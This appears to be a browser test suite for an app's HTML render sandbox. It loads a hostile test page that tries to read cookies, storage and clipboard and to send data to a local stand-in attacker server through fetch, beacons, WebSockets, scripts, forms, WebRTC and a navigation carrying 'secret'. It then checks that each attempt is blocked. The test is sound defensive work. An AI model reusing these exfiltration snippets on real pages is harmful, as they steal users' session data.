/**
 * The page sandbox in a real browser: a hostile page goes through the same two
 * frames as in the app, with a cookie and storage on the app's side and a
 * listening server standing in for the attacker. Needs Chrome or Chromium on
 * the machine, otherwise it says so and skips.
 */
import dgram from "node:dgram";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";

import {
  HTML_RENDER_SANDBOX,
  htmlRenderFrameDocument,
  injectHtmlRenderBootstrap,
} from "@t3tools/shared/htmlRender";
import { chromium, type Browser } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { capturePage } from "./pageCapture.ts";

const listen = (server: Server) =>
  new Promise<number>((resolve) => {
    server.listen(0, "127.0.0.1", () => resolve((server.address() as AddressInfo).port));
  });

const PNG =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";

/** Every attempt ends in one line of the report the page posts to the app. */
const hostilePage = (attacker: string, stunPort: number) =>
  injectHtmlRenderBootstrap(`<!doctype html><html><head><title>report</title></head><body>
<iframe id="markup" srcdoc="<script>parent.postMessage({nested:'markup'},'*')</script>"></iframe>
<script type="module">
const out = {};
const attempt = async (name, fn) => {
  try {
    out[name] = await Promise.race([fn(), new Promise((ok) => setTimeout(() => ok("timeout"), 700))]);
  } catch (error) {
    out[name] = "blocked";
  }
};
const loaded = (make) => new Promise((ok, no) => {
  const element = make();
  element.onload = () => ok("LOADED");
  element.onerror = () => no(new Error("load"));
  document.head.append(element);
});
await attempt("origin", () => self.origin);
await attempt("cookie", () => document.cookie);
await attempt("localStorage", () => localStorage.getItem("session"));
await attempt("indexedDB", () => new Promise((ok, no) => {
  const open = indexedDB.open("x");
  open.onsuccess = () => ok("OPEN");
  open.onerror = () => no(open.error);
}));
await attempt("parentDocument", () => parent.document.title);
await attempt("topDocument", () => top.document.title);
await attempt("topLocation", () => top.location.href);
await attempt("fetch", () => fetch("${attacker}/fetch").then((r) => r.status));
await attempt("fetchNoCors", () => fetch("${attacker}/nocors", { mode: "no-cors" }).then((r) => r.type));
await attempt("xhr", () => new Promise((ok, no) => {
  const x = new XMLHttpRequest();
  x.open("GET", "${attacker}/xhr");
  x.onload = () => ok(x.status);
  x.onerror = () => no(new Error("xhr"));
  x.send();
}));
await attempt("beacon", () => {
  navigator.sendBeacon("${attacker}/beacon", "x");
  return new Promise((ok) => setTimeout(() => ok("sent"), 100));
});
await attempt("webSocket", () => new Promise((ok, no) => {
  const socket = new WebSocket("${attacker.replace("http", "ws")}/ws");
  socket.onopen = () => ok("OPEN");
  socket.onerror = () => no(new Error("ws"));
}));
await attempt("image", () => new Promise((ok, no) => {
  const image = new Image();
  image.onload = () => ok("LOADED");
  image.onerror = () => no(new Error("image"));
  image.src = "${attacker}/image.png";
}));
await attempt("stylesheet", () => loaded(() => Object.assign(document.createElement("link"), { rel: "stylesheet", href: "${attacker}/x.css" })));
await attempt("script", () => loaded(() => Object.assign(document.createElement("script"), { src: "${attacker}/x.js" })));
await attempt("windowOpen", () => String(window.open("${attacker}/popup")));
await attempt("serviceWorker", () => navigator.serviceWorker.register("sw.js").then(() => "REGISTERED"));
await attempt("clipboard", () => navigator.clipboard.readText());
await attempt("webrtc", () => {
  const peer = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stunPort}" }] });
  peer.createDataChannel("x");
  return peer.createOffer().then((offer) => peer.setLocalDescription(offer)).then(() => "GATHERING");
});
await attempt("nestedFrame", () => new Promise((ok) => {
  addEventListener("message", (event) => { if (event.data && event.data.nested) ok("RAN"); });
  const frame = document.createElement("iframe");
  frame.srcdoc = "<script>parent.postMessage({nested:'script'},'*')<" + "/script>";
  document.body.append(frame);
  setTimeout(() => ok("removed"), 300);
}));
await attempt("markupFrame", () => document.getElementById("markup") ? "KEPT" : "removed");
await attempt("dataImage", () => new Promise((ok, no) => {
  const image = new Image();
  image.onload = () => ok("loaded");
  image.onerror = () => no(new Error("image"));
  image.src = ${JSON.stringify(PNG)};
}));
await attempt("evalInPage", () => eval("1 + 1"));
await attempt("drawsOnCanvas", () => document.createElement("canvas").getContext("2d") ? "yes" : "no");
parent.postMessage({ report: out }, "*");
setTimeout(() => {
  const form = document.createElement("form");
  form.action = "${attacker}/form";
  form.method = "post";
  document.body.append(form);
  form.submit();
}, 50);
setTimeout(() => { location.href = "${attacker}/self-navigation?data=secret"; }, 300);
</script></body></html>`);

const attributeEscape = (text: string) => text.replace(/&/g, "&amp;").replace(/"/g, "&quot;");

let browser: Browser | null = null;
let skipReason = "";

beforeAll(async () => {
  const launch = (channel?: "chrome") =>
    chromium.launch({ headless: true, ...(channel ? { channel } : {}) });
  browser = await launch()
    .catch(() => launch("chrome"))
    .catch((cause: unknown) => {
      skipReason = String(cause);
      return null;
    });
});

afterAll(async () => {
  await browser?.close();
});

describe("a page in the sandbox", () => {
  it("reaches nothing but what it was given", { timeout: 40_000 }, async (context) => {
    if (browser === null) {
      console.warn(`No browser here, sandbox test skipped: ${skipReason}`);
      context.skip();
      return;
    }

    const requests: string[] = [];
    const attacker = createServer((request, response) => {
      // The installed desktop app scans local ports with a plain GET /.
      if (request.url !== "/") requests.push(`${request.method} ${request.url}`);
      response.setHeader("access-control-allow-origin", "*");
      response.end("ok");
    });
    const attackerUrl = `http://127.0.0.1:${await listen(attacker)}`;

    const stun = dgram.createSocket("udp4");
    let stunPackets = 0;
    stun.on("message", () => {
      stunPackets += 1;
    });
    await new Promise<void>((resolve) => stun.bind(0, "127.0.0.1", resolve));

    const frame = htmlRenderFrameDocument(hostilePage(attackerUrl, stun.address().port));
    const app = createServer((request, response) => {
      if (request.url !== "/app") {
        // The tab's own favicon; anything else came from the page.
        if (request.url !== "/favicon.ico") {
          requests.push(`app ${request.method} ${request.url} ${request.headers.cookie ?? ""}`);
        }
        response.end("no");
        return;
      }
      response.setHeader("set-cookie", "session=SECRET; Path=/");
      response.setHeader("content-type", "text/html");
      response.end(`<!doctype html><title>APP</title><script>
localStorage.setItem("session", "SECRET");
window.received = [];
addEventListener("message", (event) => received.push(event.data));
</script><iframe sandbox="${HTML_RENDER_SANDBOX}" srcdoc="${attributeEscape(frame)}"></iframe>`);
    });
    const appUrl = `http://127.0.0.1:${await listen(app)}/app`;

    const page = await (await browser.newContext()).newPage();
    const popups: string[] = [];
    page.on("popup", (popup) => popups.push(popup.url()));
    try {
      await page.goto(appUrl);
      await page.waitForFunction(
        "window.received.some((message) => message && message.report)",
        undefined,
        { timeout: 25_000 },
      );
      // Time for the form and the self-navigation, which run after the report.
      await page.waitForTimeout(1_000);

      const received = (await page.evaluate("window.received")) as ReadonlyArray<{
        report?: Record<string, unknown>;
        method?: string;
        nested?: string;
      }>;
      const report = received.find((message) => message?.report)?.report;

      expect(report).toMatchObject({
        origin: "null",
        cookie: "blocked",
        localStorage: "blocked",
        indexedDB: "blocked",
        parentDocument: "blocked",
        topDocument: "blocked",
        topLocation: "blocked",
        fetch: "blocked",
        fetchNoCors: "blocked",
        xhr: "blocked",
        webSocket: "blocked",
        image: "blocked",
        stylesheet: "blocked",
        script: "blocked",
        windowOpen: "null",
        serviceWorker: "blocked",
        clipboard: "blocked",
        webrtc: "blocked",
        nestedFrame: "removed",
        markupFrame: "removed",
      });
      // What a report needs keeps working.
      expect(report).toMatchObject({ dataImage: "loaded", evalInPage: 2, drawsOnCanvas: "yes" });

      expect(requests).toEqual([]);
      expect(stunPackets).toBe(0);
      expect(popups).toEqual([]);
      expect(page.url()).toBe(appUrl);
      expect(received.some((message) => message?.nested)).toBe(false);
      // The way that must stay open: the page telling the app its height.
      expect(received.map((message) => message?.method)).toContain("ui/notifications/size-changed");
    } finally {
      await page.close();
      attacker.close();
      app.close();
      stun.close();
    }
  });
});

describe("the agent's preview", () => {
  it("is a real picture of the page, with what was blocked", { timeout: 30_000 }, async (context) => {
    if (browser === null) {
      context.skip();
      return;
    }
    const capture = await capturePage(browser, {
      html: injectHtmlRenderBootstrap(
        `<!doctype html><html><body><h1 style="height:320px">Revenue</h1><img src="https://example.com/x.png"></body></html>`,
      ),
      width: 640,
      appearance: "dark",
    });
    expect(Buffer.from(capture.png, "base64").subarray(1, 4).toString()).toBe("PNG");
    expect(capture.contentHeight).toBeGreaterThan(300);
    expect(capture.blockedRequests.join()).toContain("example.com");
  });
});
